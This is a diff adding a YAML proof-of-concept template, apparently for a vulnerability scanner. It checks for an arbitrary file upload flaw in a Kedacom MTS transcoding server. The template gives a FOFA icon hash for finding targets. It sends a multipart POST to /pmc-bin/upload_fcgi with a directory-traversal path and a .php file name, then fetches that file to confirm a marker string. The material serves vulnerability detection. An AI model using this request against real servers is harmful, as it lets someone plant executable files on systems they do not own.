@@ -1,0 +1,35 @@
+id: poc-yaml-keda-kedacom-anyfile-upload
+info:
+  name: 科达-Kedacom系统-文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: MTS转码服务器
+  fofa: icon_hash="-908445132"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /pmc-bin/upload_fcgi?uploadDir=../&uploadName={{.filename}}.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+  data: '----WebKitFormBoundary
+
+    Content-Disposition: form-data; name="Filedata": filename="{{.filename}}"
+
+    Content-Type: application/octet-stream
+
+
+    This website has a vulnerability {{.t1}}
+
+    ----WebKitFormBoundary--
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"<errorCode>\") &&\ncontains(headers,\"\
+    text/xml\")\n"
+- method: POST
+  path: /{{.filename}}.php
+  expression: "status_code == 200 && \ncontains(body,t1) && \ncontains(body,\"This\
+    \ website has a vulnerability\")\n"
+transport: http
